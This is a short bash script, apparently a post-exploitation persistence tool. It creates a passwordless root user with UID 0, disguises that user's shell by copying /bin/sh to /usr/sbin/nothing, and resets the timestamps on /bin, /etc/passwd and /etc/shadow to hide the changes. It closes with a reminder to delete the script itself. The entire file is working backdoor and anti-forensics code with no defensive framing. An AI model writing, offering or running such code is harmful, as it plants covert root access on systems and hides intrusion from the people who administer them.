#!/bin/bash
usage () {
	echo "Usage: $0 <username>"
}

if [ $# -ne 1 ]; then
	usage
	exit 1
fi

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi

new_username="$1"

get_old_timestamp () {
	stat $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
}

home_directory="/sbin"
obfuscated_shell_bin="/usr/sbin/nothing"

# Create a new obfuscated shell binary so it's not as noticeable in /etc/passwd
old_bin_timestamp=$(get_old_timestamp /bin)
old_sh_timestamp=$(get_old_timestamp /bin/sh)
cp "/bin/sh" "$obfuscated_shell_bin"
touch -t $old_bin_timestamp /bin
touch -t $old_sh_timestamp $obfuscated_shell_bin
echo "[+] Created new obfuscated shell binary: copied '/bin/sh' to '$obfuscated_shell_bin'"

# Create the new passwordless root user
old_passwd_timestamp=$(get_old_timestamp /etc/passwd)
old_shadow_timestamp=$(get_old_timestamp /etc/shadow)
if ! useradd -l -o -u 0 -g 0 -M -c "$new_username" -d "$home_directory" -s "$obfuscated_shell_bin" "$new_username"; then
	echo "[!] Could not add new user '$new_username'"
	exit 1
fi
sed -i "s/$new_username:[!*]*:/$new_username::/g" /etc/shadow
touch -t $old_passwd_timestamp /etc/passwd
touch -t $old_shadow_timestamp /etc/shadow
echo "[+] New passwordless root user '$new_username' added"
echo "[+] If rearranging passwd or shadow, run these commands when done to modify the timestamps:
touch -t $old_passwd_timestamp /etc/passwd
touch -t $old_shadow_timestamp /etc/shadow"

echo
echo "[!!!] Don't forget to delete me!"
